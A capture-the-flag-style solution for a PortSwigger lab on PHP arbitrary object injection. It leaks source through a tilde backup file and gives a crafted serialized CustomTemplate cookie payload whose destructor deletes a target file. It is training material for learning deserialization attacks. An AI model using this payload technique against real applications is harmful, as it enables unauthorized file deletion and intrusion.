# Lab 06 — Arbitrary object injection in PHP

> **Expert** · [Official lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

**Entry point:** unsigned serialized PHP session cookie (`User` object) ·
**Goal:** delete `/home/carlos/morale.txt` via a gadget class.

## Solution

1. Log in (`wiener:peter`), decode the cookie:
   `O:4:"User":1:{s:12:"username";s:6:"wiener";}`
2. Leak the source with the **tilde backup trick**: request
   `/cgi-bin/libs/CustomTemplate.php~` — the source reveals a
   `CustomTemplate` class whose `__destruct` handler acts on the
   `lock_file_path` attribute (file operation).
3. Craft the cookie to instantiate the gadget class with your target path:

```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

(Base64 + URL-encode it as the session cookie.)

4. Send any request — the session deserializes the object, the destructor
   deletes the file — lab solved.

## Notes

No `User`-class mutation needed this time: inject a *different* class
entirely — PHP instantiates whatever the cookie names.
